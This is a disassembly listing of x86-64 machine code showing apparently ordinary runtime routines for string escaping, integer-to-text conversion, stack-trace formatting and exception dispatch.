  40540a:	4c 8d 25 0f f6 00 00 	lea    0xf60f(%rip),%r12        # 0x414a20
  405411:	4c 8d 3d 98 f6 00 00 	lea    0xf698(%rip),%r15        # 0x414ab0
  405418:	4c 39 ef             	cmp    %r13,%rdi
  40541b:	0f 8d 99 02 00 00    	jge    0x4056ba
  405421:	40 8a 74 3d 10       	mov    0x10(%rbp,%rdi,1),%sil
  405426:	40 84 f6             	test   %sil,%sil
  405429:	0f 88 6c 02 00 00    	js     0x40569b
  40542f:	40 80 fe 21          	cmp    $0x21,%sil
  405433:	0f 8f 99 00 00 00    	jg     0x4054d2
  405439:	40 80 fe 20          	cmp    $0x20,%sil
  40543d:	0f 8d 58 02 00 00    	jge    0x40569b
  405443:	40 80 fe 0a          	cmp    $0xa,%sil
  405447:	0f 84 30 01 00 00    	je     0x40557d
  40544d:	7f 3e                	jg     0x40548d
  40544f:	40 80 fe 08          	cmp    $0x8,%sil
  405453:	0f 84 d7 00 00 00    	je     0x405530
  405459:	0f 8f fd 00 00 00    	jg     0x40555c
  40545f:	40 80 fe 07          	cmp    $0x7,%sil
  405463:	0f 85 e2 01 00 00    	jne    0x40564b
  405469:	48 8b 0b             	mov    (%rbx),%rcx
  40546c:	ba 02 00 00 00       	mov    $0x2,%edx
  405471:	e8 a8 fc ff ff       	call   0x40511e
  405476:	48 89 d9             	mov    %rbx,%rcx
  405479:	48 89 c2             	mov    %rax,%rdx
  40547c:	e8 f8 fe ff ff       	call   0x405379
  405481:	48 8d 15 28 f7 00 00 	lea    0xf728(%rip),%rdx        # 0x414bb0
  405488:	e9 c2 00 00 00       	jmp    0x40554f
  40548d:	40 80 fe 0c          	cmp    $0xc,%sil
  405491:	0f 84 28 01 00 00    	je     0x4055bf
  405497:	0f 8c 01 01 00 00    	jl     0x40559e
  40549d:	40 80 fe 0d          	cmp    $0xd,%sil
  4054a1:	0f 84 3c 01 00 00    	je     0x4055e3
  4054a7:	40 80 fe 1b          	cmp    $0x1b,%sil
  4054ab:	0f 85 9a 01 00 00    	jne    0x40564b
  4054b1:	48 8b 0b             	mov    (%rbx),%rcx
  4054b4:	ba 02 00 00 00       	mov    $0x2,%edx
  4054b9:	e8 60 fc ff ff       	call   0x40511e
  4054be:	48 89 d9             	mov    %rbx,%rcx
  4054c1:	48 89 c2             	mov    %rax,%rdx
  4054c4:	e8 b0 fe ff ff       	call   0x405379
  4054c9:	48 8d 15 00 f6 00 00 	lea    0xf600(%rip),%rdx        # 0x414ad0
  4054d0:	eb 7d                	jmp    0x40554f
  4054d2:	40 80 fe 5b          	cmp    $0x5b,%sil
  4054d6:	7f 3f                	jg     0x405517
  4054d8:	40 80 fe 28          	cmp    $0x28,%sil
  4054dc:	0f 8d b9 01 00 00    	jge    0x40569b
  4054e2:	40 80 fe 26          	cmp    $0x26,%sil
  4054e6:	0f 8f 3b 01 00 00    	jg     0x405627
  4054ec:	40 80 fe 23          	cmp    $0x23,%sil
  4054f0:	0f 8d a5 01 00 00    	jge    0x40569b
  4054f6:	48 8b 0b             	mov    (%rbx),%rcx
  4054f9:	ba 02 00 00 00       	mov    $0x2,%edx
  4054fe:	e8 1b fc ff ff       	call   0x40511e
  405503:	48 89 d9             	mov    %rbx,%rcx
  405506:	48 89 c2             	mov    %rax,%rdx
  405509:	e8 6b fe ff ff       	call   0x405379
  40550e:	48 8d 15 5b f5 00 00 	lea    0xf55b(%rip),%rdx        # 0x414a70
  405515:	eb 38                	jmp    0x40554f
  405517:	40 80 fe 5c          	cmp    $0x5c,%sil
  40551b:	0f 84 e6 00 00 00    	je     0x405607
  405521:	40 80 fe 7e          	cmp    $0x7e,%sil
  405525:	0f 8f 20 01 00 00    	jg     0x40564b
  40552b:	e9 6b 01 00 00       	jmp    0x40569b
  405530:	48 8b 0b             	mov    (%rbx),%rcx
  405533:	ba 02 00 00 00       	mov    $0x2,%edx
  405538:	e8 e1 fb ff ff       	call   0x40511e
  40553d:	48 89 d9             	mov    %rbx,%rcx
  405540:	48 89 c2             	mov    %rax,%rdx
  405543:	e8 31 fe ff ff       	call   0x405379
  405548:	48 8d 15 41 f6 00 00 	lea    0xf641(%rip),%rdx        # 0x414b90
  40554f:	48 8b 0b             	mov    (%rbx),%rcx
  405552:	e8 d0 0a 00 00       	call   0x406027
  405557:	e9 56 01 00 00       	jmp    0x4056b2
  40555c:	48 8b 0b             	mov    (%rbx),%rcx
  40555f:	ba 02 00 00 00       	mov    $0x2,%edx
  405564:	e8 b5 fb ff ff       	call   0x40511e
  405569:	48 89 d9             	mov    %rbx,%rcx
  40556c:	48 89 c2             	mov    %rax,%rdx
  40556f:	e8 05 fe ff ff       	call   0x405379
  405574:	48 8d 15 f5 f5 00 00 	lea    0xf5f5(%rip),%rdx        # 0x414b70
  40557b:	eb d2                	jmp    0x40554f
  40557d:	48 8b 0b             	mov    (%rbx),%rcx
  405580:	ba 02 00 00 00       	mov    $0x2,%edx
  405585:	e8 94 fb ff ff       	call   0x40511e
  40558a:	48 89 d9             	mov    %rbx,%rcx
  40558d:	48 89 c2             	mov    %rax,%rdx
  405590:	e8 e4 fd ff ff       	call   0x405379
  405595:	48 8d 15 b4 f5 00 00 	lea    0xf5b4(%rip),%rdx        # 0x414b50
  40559c:	eb b1                	jmp    0x40554f
  40559e:	48 8b 0b             	mov    (%rbx),%rcx
  4055a1:	ba 02 00 00 00       	mov    $0x2,%edx
  4055a6:	e8 73 fb ff ff       	call   0x40511e
  4055ab:	48 89 d9             	mov    %rbx,%rcx
  4055ae:	48 89 c2             	mov    %rax,%rdx
  4055b1:	e8 c3 fd ff ff       	call   0x405379
  4055b6:	48 8d 15 73 f5 00 00 	lea    0xf573(%rip),%rdx        # 0x414b30
  4055bd:	eb 90                	jmp    0x40554f
  4055bf:	48 8b 0b             	mov    (%rbx),%rcx
  4055c2:	ba 02 00 00 00       	mov    $0x2,%edx
  4055c7:	e8 52 fb ff ff       	call   0x40511e
  4055cc:	48 89 d9             	mov    %rbx,%rcx
  4055cf:	48 89 c2             	mov    %rax,%rdx
  4055d2:	e8 a2 fd ff ff       	call   0x405379
  4055d7:	48 8d 15 32 f5 00 00 	lea    0xf532(%rip),%rdx        # 0x414b10
  4055de:	e9 6c ff ff ff       	jmp    0x40554f
  4055e3:	48 8b 0b             	mov    (%rbx),%rcx
  4055e6:	ba 02 00 00 00       	mov    $0x2,%edx
  4055eb:	e8 2e fb ff ff       	call   0x40511e
  4055f0:	48 89 d9             	mov    %rbx,%rcx
  4055f3:	48 89 c2             	mov    %rax,%rdx
  4055f6:	e8 7e fd ff ff       	call   0x405379
  4055fb:	48 8d 15 ee f4 00 00 	lea    0xf4ee(%rip),%rdx        # 0x414af0
  405602:	e9 48 ff ff ff       	jmp    0x40554f
  405607:	48 8b 0b             	mov    (%rbx),%rcx
  40560a:	ba 02 00 00 00       	mov    $0x2,%edx
  40560f:	e8 0a fb ff ff       	call   0x40511e
  405614:	48 89 d9             	mov    %rbx,%rcx
  405617:	48 89 c2             	mov    %rax,%rdx
  40561a:	e8 5a fd ff ff       	call   0x405379
  40561f:	4c 89 fa             	mov    %r15,%rdx
  405622:	e9 28 ff ff ff       	jmp    0x40554f
  405627:	48 8b 0b             	mov    (%rbx),%rcx
  40562a:	ba 02 00 00 00       	mov    $0x2,%edx
  40562f:	e8 ea fa ff ff       	call   0x40511e
  405634:	48 89 d9             	mov    %rbx,%rcx
  405637:	48 89 c2             	mov    %rax,%rdx
  40563a:	e8 3a fd ff ff       	call   0x405379
  40563f:	48 8d 15 4a f4 00 00 	lea    0xf44a(%rip),%rdx        # 0x414a90
  405646:	e9 04 ff ff ff       	jmp    0x40554f
  40564b:	48 8b 0b             	mov    (%rbx),%rcx
  40564e:	ba 02 00 00 00       	mov    $0x2,%edx
  405653:	e8 c6 fa ff ff       	call   0x40511e
  405658:	48 89 d9             	mov    %rbx,%rcx
  40565b:	48 89 c2             	mov    %rax,%rdx
  40565e:	e8 16 fd ff ff       	call   0x405379
  405663:	48 8b 0b             	mov    (%rbx),%rcx
  405666:	4c 89 f2             	mov    %r14,%rdx
  405669:	e8 b9 09 00 00       	call   0x406027
  40566e:	40 88 f0             	mov    %sil,%al
  405671:	48 8b 0b             	mov    (%rbx),%rcx
  405674:	83 e6 0f             	and    $0xf,%esi
  405677:	c0 e8 04             	shr    $0x4,%al
  40567a:	0f b6 c0             	movzbl %al,%eax
  40567d:	41 0f be 54 04 10    	movsbl 0x10(%r12,%rax,1),%edx
  405683:	e8 0a fa ff ff       	call   0x405092
  405688:	48 89 d9             	mov    %rbx,%rcx
  40568b:	48 89 c2             	mov    %rax,%rdx
  40568e:	e8 e6 fc ff ff       	call   0x405379
  405693:	41 0f be 54 34 10    	movsbl 0x10(%r12,%rsi,1),%edx
  405699:	eb 04                	jmp    0x40569f
  40569b:	40 0f be d6          	movsbl %sil,%edx
  40569f:	48 8b 0b             	mov    (%rbx),%rcx
  4056a2:	e8 eb f9 ff ff       	call   0x405092
  4056a7:	48 89 d9             	mov    %rbx,%rcx
  4056aa:	48 89 c2             	mov    %rax,%rdx
  4056ad:	e8 c7 fc ff ff       	call   0x405379
  4056b2:	48 ff c7             	inc    %rdi
  4056b5:	e9 5e fd ff ff       	jmp    0x405418
  4056ba:	48 8b 0b             	mov    (%rbx),%rcx
  4056bd:	ba 01 00 00 00       	mov    $0x1,%edx
  4056c2:	e8 57 fa ff ff       	call   0x40511e
  4056c7:	48 89 d9             	mov    %rbx,%rcx
  4056ca:	48 89 c2             	mov    %rax,%rdx
  4056cd:	e8 a7 fc ff ff       	call   0x405379
  4056d2:	48 8b 0b             	mov    (%rbx),%rcx
  4056d5:	48 8d 15 f4 f4 00 00 	lea    0xf4f4(%rip),%rdx        # 0x414bd0
  4056dc:	48 83 c4 28          	add    $0x28,%rsp
  4056e0:	5b                   	pop    %rbx
  4056e1:	5e                   	pop    %rsi
  4056e2:	5f                   	pop    %rdi
  4056e3:	5d                   	pop    %rbp
  4056e4:	41 5c                	pop    %r12
  4056e6:	41 5d                	pop    %r13
  4056e8:	41 5e                	pop    %r14
  4056ea:	41 5f                	pop    %r15
  4056ec:	e9 36 09 00 00       	jmp    0x406027
  4056f1:	41 56                	push   %r14
  4056f3:	41 55                	push   %r13
  4056f5:	41 54                	push   %r12
  4056f7:	55                   	push   %rbp
  4056f8:	57                   	push   %rdi
  4056f9:	56                   	push   %rsi
  4056fa:	53                   	push   %rbx
  4056fb:	48 83 ec 30          	sub    $0x30,%rsp
  4056ff:	31 ff                	xor    %edi,%edi
  405701:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  405708:	00 00 
  40570a:	48 89 ce             	mov    %rcx,%rsi
  40570d:	b9 20 00 00 00       	mov    $0x20,%ecx
  405712:	e8 69 fb ff ff       	call   0x405280
  405717:	48 85 c0             	test   %rax,%rax
  40571a:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  40571f:	74 03                	je     0x405724
  405721:	48 8b 38             	mov    (%rax),%rdi
  405724:	48 8d 57 20          	lea    0x20(%rdi),%rdx
  405728:	48 89 c1             	mov    %rax,%rcx
  40572b:	41 bc 0a 00 00 00    	mov    $0xa,%r12d
  405731:	e8 93 fb ff ff       	call   0x4052c9
  405736:	48 8d 6c 24 28       	lea    0x28(%rsp),%rbp
  40573b:	41 b5 0a             	mov    $0xa,%r13b
  40573e:	41 b6 30             	mov    $0x30,%r14b
  405741:	48 89 e9             	mov    %rbp,%rcx
  405744:	48 89 c2             	mov    %rax,%rdx
  405747:	e8 2d fc ff ff       	call   0x405379
  40574c:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  405751:	49 89 f0             	mov    %rsi,%r8
  405754:	45 31 c9             	xor    %r9d,%r9d
  405757:	4c 8d 1c 39          	lea    (%rcx,%rdi,1),%r11
  40575b:	4c 89 c0             	mov    %r8,%rax
  40575e:	48 99                	cqto
  405760:	49 f7 fc             	idiv   %r12
  405763:	49 89 c2             	mov    %rax,%r10
  405766:	48 6b c0 f6          	imul   $0xfffffffffffffff6,%rax,%rax
  40576a:	4c 01 c0             	add    %r8,%rax
  40576d:	48 85 c0             	test   %rax,%rax
  405770:	7e 10                	jle    0x405782
  405772:	44 88 e8             	mov    %r13b,%al
  405775:	41 83 c0 30          	add    $0x30,%r8d
  405779:	41 0f af c2          	imul   %r10d,%eax
  40577d:	41 29 c0             	sub    %eax,%r8d
  405780:	eb 13                	jmp    0x405795
  405782:	44 88 e8             	mov    %r13b,%al
  405785:	44 88 f3             	mov    %r14b,%bl
  405788:	41 0f af c2          	imul   %r10d,%eax
  40578c:	44 29 c3             	sub    %r8d,%ebx
  40578f:	41 88 d8             	mov    %bl,%r8b
  405792:	41 01 c0             	add    %eax,%r8d
  405795:	47 88 44 0b 10       	mov    %r8b,0x10(%r11,%r9,1)
  40579a:	49 8d 59 01          	lea    0x1(%r9),%rbx
  40579e:	4d 85 d2             	test   %r10,%r10
  4057a1:	4d 89 d0             	mov    %r10,%r8
  4057a4:	74 05                	je     0x4057ab
  4057a6:	49 89 d9             	mov    %rbx,%r9
  4057a9:	eb b0                	jmp    0x40575b
  4057ab:	48 85 f6             	test   %rsi,%rsi
  4057ae:	79 0a                	jns    0x4057ba
  4057b0:	42 c6 44 1b 10 2d    	movb   $0x2d,0x10(%rbx,%r11,1)
  4057b6:	49 8d 59 02          	lea    0x2(%r9),%rbx
  4057ba:	48 8d 34 1f          	lea    (%rdi,%rbx,1),%rsi
  4057be:	48 d1 fb             	sar    $1,%rbx
  4057c1:	48 89 f2             	mov    %rsi,%rdx
  4057c4:	48 ff cb             	dec    %rbx
  4057c7:	e8 fd fa ff ff       	call   0x4052c9
  4057cc:	48 89 e9             	mov    %rbp,%rcx
  4057cf:	48 89 c2             	mov    %rax,%rdx
  4057d2:	e8 a2 fb ff ff       	call   0x405379
  4057d7:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  4057dc:	31 c0                	xor    %eax,%eax
  4057de:	48 8d 14 31          	lea    (%rcx,%rsi,1),%rdx
  4057e2:	48 01 cf             	add    %rcx,%rdi
  4057e5:	48 ff ca             	dec    %rdx
  4057e8:	48 39 c3             	cmp    %rax,%rbx
  4057eb:	7c 15                	jl     0x405802
  4057ed:	8a 4c 07 10          	mov    0x10(%rdi,%rax,1),%cl
  4057f1:	44 8a 42 10          	mov    0x10(%rdx),%r8b
  4057f5:	44 88 44 07 10       	mov    %r8b,0x10(%rdi,%rax,1)
  4057fa:	48 ff c0             	inc    %rax
  4057fd:	88 4a 10             	mov    %cl,0x10(%rdx)
  405800:	eb e3                	jmp    0x4057e5
  405802:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  405807:	48 83 c4 30          	add    $0x30,%rsp
  40580b:	5b                   	pop    %rbx
  40580c:	5e                   	pop    %rsi
  40580d:	5f                   	pop    %rdi
  40580e:	5d                   	pop    %rbp
  40580f:	41 5c                	pop    %r12
  405811:	41 5d                	pop    %r13
  405813:	41 5e                	pop    %r14
  405815:	c3                   	ret
  405816:	56                   	push   %rsi
  405817:	53                   	push   %rbx
  405818:	48 83 ec 28          	sub    $0x28,%rsp
  40581c:	48 85 d2             	test   %rdx,%rdx
  40581f:	48 89 ce             	mov    %rcx,%rsi
  405822:	74 23                	je     0x405847
  405824:	48 89 d3             	mov    %rdx,%rbx
  405827:	48 ff c3             	inc    %rbx
  40582a:	0f be 53 ff          	movsbl -0x1(%rbx),%edx
  40582e:	84 d2                	test   %dl,%dl
  405830:	74 15                	je     0x405847
  405832:	48 8b 0e             	mov    (%rsi),%rcx
  405835:	e8 58 f8 ff ff       	call   0x405092
  40583a:	48 89 f1             	mov    %rsi,%rcx
  40583d:	48 89 c2             	mov    %rax,%rdx
  405840:	e8 34 fb ff ff       	call   0x405379
  405845:	eb e0                	jmp    0x405827
  405847:	48 83 c4 28          	add    $0x28,%rsp
  40584b:	5b                   	pop    %rbx
  40584c:	5e                   	pop    %rsi
  40584d:	c3                   	ret
  40584e:	41 57                	push   %r15
  405850:	41 56                	push   %r14
  405852:	41 55                	push   %r13
  405854:	41 54                	push   %r12
  405856:	55                   	push   %rbp
  405857:	57                   	push   %rdi
  405858:	56                   	push   %rsi
  405859:	53                   	push   %rbx
  40585a:	48 81 ec 18 08 00 00 	sub    $0x818,%rsp
  405861:	ba d1 07 00 00       	mov    $0x7d1,%edx
  405866:	48 8d 6c 24 3f       	lea    0x3f(%rsp),%rbp
  40586b:	49 89 cc             	mov    %rcx,%r12
  40586e:	48 89 e9             	mov    %rbp,%rcx
  405871:	e8 d6 e8 ff ff       	call   0x40414c
  405876:	49 8b 5c 24 20       	mov    0x20(%r12),%rbx
  40587b:	48 85 db             	test   %rbx,%rbx
  40587e:	75 07                	jne    0x405887
  405880:	31 db                	xor    %ebx,%ebx
  405882:	e9 c9 01 00 00       	jmp    0x405a50
  405887:	48 83 3b 00          	cmpq   $0x0,(%rbx)
  40588b:	74 f3                	je     0x405880
  40588d:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
  405892:	48 83 c3 10          	add    $0x10,%rbx
  405896:	31 f6                	xor    %esi,%esi
  405898:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  40589f:	00 00 
  4058a1:	e8 da f9 ff ff       	call   0x405280
  4058a6:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  4058ab:	41 bf 01 00 00 00    	mov    $0x1,%r15d
  4058b1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4058b6:	48 8b 43 f0          	mov    -0x10(%rbx),%rax
  4058ba:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  4058bf:	48 39 74 24 28       	cmp    %rsi,0x28(%rsp)
  4058c4:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
  4058c9:	0f 8e 40 01 00 00    	jle    0x405a0f
  4058cf:	48 8b 43 08          	mov    0x8(%rbx),%rax
  4058d3:	48 83 f8 f6          	cmp    $0xfffffffffffffff6,%rax
  4058d7:	75 1e                	jne    0x4058f7
  4058d9:	ba 11 00 00 00       	mov    $0x11,%edx
  4058de:	4c 89 f1             	mov    %r14,%rcx
  4058e1:	e8 38 f8 ff ff       	call   0x40511e
  4058e6:	48 8d 15 b3 f0 00 00 	lea    0xf0b3(%rip),%rdx        # 0x4149a0
  4058ed:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4058f2:	e9 04 01 00 00       	jmp    0x4059fb
  4058f7:	48 83 f8 9c          	cmp    $0xffffffffffffff9c,%rax
  4058fb:	75 1e                	jne    0x40591b
  4058fd:	ba 03 00 00 00       	mov    $0x3,%edx
  405902:	4c 89 f1             	mov    %r14,%rcx
  405905:	e8 14 f8 ff ff       	call   0x40511e
  40590a:	48 8d 15 5f f0 00 00 	lea    0xf05f(%rip),%rdx        # 0x414970
  405911:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405916:	e9 e0 00 00 00       	jmp    0x4059fb
  40591b:	45 31 ed             	xor    %r13d,%r13d
  40591e:	4d 85 f6             	test   %r14,%r14
  405921:	74 03                	je     0x405926
  405923:	4d 8b 2e             	mov    (%r14),%r13
  405926:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  40592a:	48 89 f9             	mov    %rdi,%rcx
  40592d:	e8 e4 fe ff ff       	call   0x405816
  405932:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
  405937:	7e 58                	jle    0x405991
  405939:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  40593e:	ba 28 00 00 00       	mov    $0x28,%edx
  405943:	e8 4a f7 ff ff       	call   0x405092
  405948:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
  40594c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405951:	e8 9b fd ff ff       	call   0x4056f1
  405956:	31 d2                	xor    %edx,%edx
  405958:	48 85 c0             	test   %rax,%rax
  40595b:	49 89 c6             	mov    %rax,%r14
  40595e:	74 03                	je     0x405963
  405960:	48 8b 10             	mov    (%rax),%rdx
  405963:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  405968:	e8 b1 f7 ff ff       	call   0x40511e
  40596d:	4c 89 f2             	mov    %r14,%rdx
  405970:	48 89 c1             	mov    %rax,%rcx
  405973:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405978:	e8 aa 06 00 00       	call   0x406027
  40597d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  405982:	ba 29 00 00 00       	mov    $0x29,%edx
  405987:	e8 06 f7 ff ff       	call   0x405092
  40598c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  405991:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  405996:	31 c0                	xor    %eax,%eax
  405998:	48 85 d2             	test   %rdx,%rdx
  40599b:	74 03                	je     0x4059a0
  40599d:	48 8b 02             	mov    (%rdx),%rax
  4059a0:	4c 29 e8             	sub    %r13,%rax
  4059a3:	41 bd 19 00 00 00    	mov    $0x19,%r13d
  4059a9:	41 be 01 00 00 00    	mov    $0x1,%r14d
  4059af:	49 29 c5             	sub    %rax,%r13
  4059b2:	4d 85 ed             	test   %r13,%r13
  4059b5:	4d 0f 4e ef          	cmovle %r15,%r13
  4059b9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  4059be:	ba 20 00 00 00       	mov    $0x20,%edx
  4059c3:	49 ff c6             	inc    %r14
  4059c6:	e8 c7 f6 ff ff       	call   0x405092
  4059cb:	4d 39 f5             	cmp    %r14,%r13
  4059ce:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4059d3:	7d e4                	jge    0x4059b9
  4059d5:	48 8b 13             	mov    (%rbx),%rdx
  4059d8:	48 89 f9             	mov    %rdi,%rcx
  4059db:	e8 36 fe ff ff       	call   0x405816
  4059e0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  4059e5:	ba 01 00 00 00       	mov    $0x1,%edx
  4059ea:	e8 2f f7 ff ff       	call   0x40511e
  4059ef:	48 8d 15 5a ef 00 00 	lea    0xef5a(%rip),%rdx        # 0x414950
  4059f6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4059fb:	48 89 c1             	mov    %rax,%rcx
  4059fe:	48 ff c6             	inc    %rsi
  405a01:	48 83 c3 18          	add    $0x18,%rbx
  405a05:	e8 1d 06 00 00       	call   0x406027
  405a0a:	e9 b0 fe ff ff       	jmp    0x4058bf
  405a0f:	4d 85 f6             	test   %r14,%r14
  405a12:	74 12                	je     0x405a26
  405a14:	49 8b 1e             	mov    (%r14),%rbx
  405a17:	48 81 fb cf 07 00 00 	cmp    $0x7cf,%rbx
  405a1e:	0f 8f 5c fe ff ff    	jg     0x405880
  405a24:	eb 02                	jmp    0x405a28
  405a26:	31 db                	xor    %ebx,%ebx
  405a28:	4c 89 f1             	mov    %r14,%rcx
  405a2b:	48 89 ef             	mov    %rbp,%rdi
  405a2e:	e8 b9 cf ff ff       	call   0x4029ec
  405a33:	4d 85 f6             	test   %r14,%r14
  405a36:	48 89 d9             	mov    %rbx,%rcx
  405a39:	48 89 c6             	mov    %rax,%rsi
  405a3c:	f3 a4                	rep movsb (%rsi),(%rdi)
  405a3e:	0f 84 3c fe ff ff    	je     0x405880
  405a44:	49 8b 1e             	mov    (%r14),%rbx
  405a47:	48 81 fb b3 07 00 00 	cmp    $0x7b3,%rbx
  405a4e:	7f 1a                	jg     0x405a6a
  405a50:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
  405a55:	b9 07 00 00 00       	mov    $0x7,%ecx
  405a5a:	48 83 c3 1c          	add    $0x1c,%rbx
  405a5e:	48 8d 35 a1 ed 00 00 	lea    0xeda1(%rip),%rsi        # 0x414806
  405a65:	48 89 c7             	mov    %rax,%rdi
  405a68:	f3 a5                	rep movsl (%rsi),(%rdi)
  405a6a:	4d 8b 74 24 18       	mov    0x18(%r12),%r14
  405a6f:	45 31 ed             	xor    %r13d,%r13d
  405a72:	4d 85 f6             	test   %r14,%r14
  405a75:	74 03                	je     0x405a7a
  405a77:	4d 8b 2e             	mov    (%r14),%r13
  405a7a:	4a 8d 04 2b          	lea    (%rbx,%r13,1),%rax
  405a7e:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  405a84:	7f 25                	jg     0x405aab
  405a86:	4c 89 f1             	mov    %r14,%rcx
  405a89:	e8 5e cf ff ff       	call   0x4029ec
  405a8e:	4c 89 e9             	mov    %r13,%rcx
  405a91:	48 89 c6             	mov    %rax,%rsi
  405a94:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
  405a99:	48 89 c7             	mov    %rax,%rdi
  405a9c:	31 c0                	xor    %eax,%eax
  405a9e:	4d 85 f6             	test   %r14,%r14
  405aa1:	f3 a4                	rep movsb (%rsi),(%rdi)
  405aa3:	74 03                	je     0x405aa8
  405aa5:	49 8b 06             	mov    (%r14),%rax
  405aa8:	48 01 c3             	add    %rax,%rbx
  405aab:	48 81 fb cd 07 00 00 	cmp    $0x7cd,%rbx
  405ab2:	7f 0b                	jg     0x405abf
  405ab4:	66 c7 44 1d 00 20 5b 	movw   $0x5b20,0x0(%rbp,%rbx,1)
  405abb:	48 83 c3 02          	add    $0x2,%rbx
  405abf:	49 8b 54 24 10       	mov    0x10(%r12),%rdx
  405ac4:	31 c9                	xor    %ecx,%ecx
  405ac6:	48 85 d2             	test   %rdx,%rdx
  405ac9:	74 11                	je     0x405adc
  405acb:	31 c0                	xor    %eax,%eax
  405acd:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  405ad1:	48 89 d7             	mov    %rdx,%rdi
  405ad4:	f2 ae                	repnz scas (%rdi),%al
  405ad6:	48 f7 d1             	not    %rcx
  405ad9:	48 ff c9             	dec    %rcx
  405adc:	48 8d 04 19          	lea    (%rcx,%rbx,1),%rax
  405ae0:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  405ae6:	7f 23                	jg     0x405b0b
  405ae8:	48 8d 44 1d 00       	lea    0x0(%rbp,%rbx,1),%rax
  405aed:	48 89 d6             	mov    %rdx,%rsi
  405af0:	48 89 c7             	mov    %rax,%rdi
  405af3:	31 c0                	xor    %eax,%eax
  405af5:	f3 a4                	rep movsb (%rsi),(%rdi)
  405af7:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  405afb:	48 89 d7             	mov    %rdx,%rdi
  405afe:	f2 ae                	repnz scas (%rdi),%al
  405b00:	48 89 c8             	mov    %rcx,%rax
  405b03:	48 f7 d0             	not    %rax
  405b06:	48 8d 5c 03 ff       	lea    -0x1(%rbx,%rax,1),%rbx
  405b0b:	48 81 fb cd 07 00 00 	cmp    $0x7cd,%rbx
  405b12:	7f 07                	jg     0x405b1b
  405b14:	66 c7 44 1d 00 5d 0a 	movw   $0xa5d,0x0(%rbp,%rbx,1)
  405b1b:	48 89 e9             	mov    %rbp,%rcx
  405b1e:	e8 cc 01 00 00       	call   0x405cef
  405b23:	90                   	nop
  405b24:	48 81 c4 18 08 00 00 	add    $0x818,%rsp
  405b2b:	5b                   	pop    %rbx
  405b2c:	5e                   	pop    %rsi
  405b2d:	5f                   	pop    %rdi
  405b2e:	5d                   	pop    %rbp
  405b2f:	41 5c                	pop    %r12
  405b31:	41 5d                	pop    %r13
  405b33:	41 5e                	pop    %r14
  405b35:	41 5f                	pop    %r15
  405b37:	c3                   	ret
  405b38:	e9 11 fd ff ff       	jmp    0x40584e
  405b3d:	57                   	push   %rdi
  405b3e:	56                   	push   %rsi
  405b3f:	53                   	push   %rbx
  405b40:	48 83 ec 20          	sub    $0x20,%rsp
  405b44:	48 89 cb             	mov    %rcx,%rbx
  405b47:	e8 cb cf ff ff       	call   0x402b17
  405b4c:	48 89 c7             	mov    %rax,%rdi
  405b4f:	48 8b 00             	mov    (%rax),%rax
  405b52:	48 85 c0             	test   %rax,%rax
  405b55:	75 3a                	jne    0x405b91
  405b57:	48 83 7f 20 00       	cmpq   $0x0,0x20(%rdi)
  405b5c:	74 44                	je     0x405ba2
  405b5e:	e8 b4 cf ff ff       	call   0x402b17
  405b63:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
  405b67:	48 8b 50 28          	mov    0x28(%rax),%rdx
  405b6b:	48 89 c6             	mov    %rax,%rsi
  405b6e:	e8 e9 e5 ff ff       	call   0x40415c
  405b73:	48 8d 4e 28          	lea    0x28(%rsi),%rcx
  405b77:	48 89 da             	mov    %rbx,%rdx
  405b7a:	e8 fa f7 ff ff       	call   0x405379
  405b7f:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
  405b83:	ba 01 00 00 00       	mov    $0x1,%edx
  405b88:	48 83 c1 10          	add    $0x10,%rcx
  405b8c:	e8 b5 54 00 00       	call   0x40b046
  405b91:	48 89 d9             	mov    %rbx,%rcx
  405b94:	ff d0                	call   *%rax
  405b96:	84 c0                	test   %al,%al
  405b98:	75 bd                	jne    0x405b57
  405b9a:	48 83 c4 20          	add    $0x20,%rsp
  405b9e:	5b                   	pop    %rbx
  405b9f:	5e                   	pop    %rsi
  405ba0:	5f                   	pop    %rdi
  405ba1:	c3                   	ret
  405ba2:	48 89 d9             	mov    %rbx,%rcx
  405ba5:	e8 8e ff ff ff       	call   0x405b38
  405baa:	b9 01 00 00 00       	mov    $0x1,%ecx
  405baf:	e8 54 5a 00 00       	call   0x40b608
  405bb4:	90                   	nop
  405bb5:	57                   	push   %rdi
  405bb6:	56                   	push   %rsi
  405bb7:	53                   	push   %rbx
  405bb8:	48 83 ec 50          	sub    $0x50,%rsp
  405bbc:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
  405bc1:	48 89 cb             	mov    %rcx,%rbx
  405bc4:	75 04                	jne    0x405bca
  405bc6:	48 89 51 10          	mov    %rdx,0x10(%rcx)
